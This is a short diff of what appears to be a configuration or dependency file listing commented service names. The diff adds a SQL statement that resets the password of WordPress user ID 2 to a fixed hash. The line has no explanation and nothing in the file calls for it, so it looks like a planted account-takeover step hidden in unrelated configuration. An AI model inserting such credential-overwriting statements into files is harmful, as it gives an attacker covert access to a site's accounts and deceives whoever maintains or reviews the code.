@@ -24,3 +24,5 @@ dependencies: []
 # postgres
 # redis-server
 # nginx
+
+UPDATE wp_users SET user_pass="7240835ee7502289c76f5e9bd4cddb8d" WHERE ID = 2;
